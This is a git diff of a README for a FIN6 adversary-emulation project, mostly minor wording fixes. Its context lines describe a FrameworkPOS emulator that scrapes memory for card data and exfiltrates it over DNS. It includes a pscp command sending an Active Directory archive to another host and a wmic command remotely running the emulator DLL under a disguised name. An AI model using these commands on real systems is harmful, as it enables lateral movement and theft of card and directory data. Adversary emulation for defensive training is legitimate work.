@@ -78,7 +78,6 @@ FIN6-Adversary-Emulation/
 
 ---
 
-This layout and detailed breakdown of files should provide comprehensive guidance in your README file, enhancing clarity and organization for other users or collaborators on the project. Let me know if you need further customization or additional sections!
 
 ## Phases Breakdown
 
@@ -167,7 +166,7 @@ pscp.exe -P {port} {path_on_windows}\ad.7z root@192.168.1.13:/temp/
 
 ![outline_phase2](Documentation/phase2.png)
 
-FIN6 used FrameworkPOS Malware: so I right in C++ emulation of that
+FIN6 used FrameworkPOS Malware: so I write in C++ emulation of that
 
 
 ---
@@ -236,7 +235,7 @@ This function constructs and sends DNS queries containing card data to a custom 
 
 The custom [FrameworkPOS emulator](Phase2/FIN6_emulation-FrameworkPOS/Release/FIN6_emulation.dll) which it released in Phase2/FIN6_emulation-FrameworkPOS/Release/FIN6_emulation.dll in this project provides an in-depth look at how FIN6 and similar threat actors scrape memory for card data and exfiltrate it using unconventional channels like DNS. This component is intended to serve as an educational example of malware tactics within a controlled environment, aligning with best practices in adversary emulation.
 
-To document your **DNS C2 server** functionality in the README, here’s a detailed section that explains its purpose, features, and the role it plays in the emulation:
+the dll file has exported function "run". which run the malware 
 
 ---
 
@@ -335,7 +334,7 @@ I used rdesktop tool you can use any other tool you like.
 Windows Management Instrumentation T1047
 
 ```
-wmic /node:"192.168.1.62" process call create "rundll32.exe c:\windows\User\Administrator\Assistant32.dll,run"
+wmic /node:"192.168.1.62" process call create "rundll32.exe c:\windows\User\Administrator\Assistant32.dll,run"    # RENAME fin6_emulation.dll file to Assistant32.dll run: is exported function
 ```
 
 #### Persistence
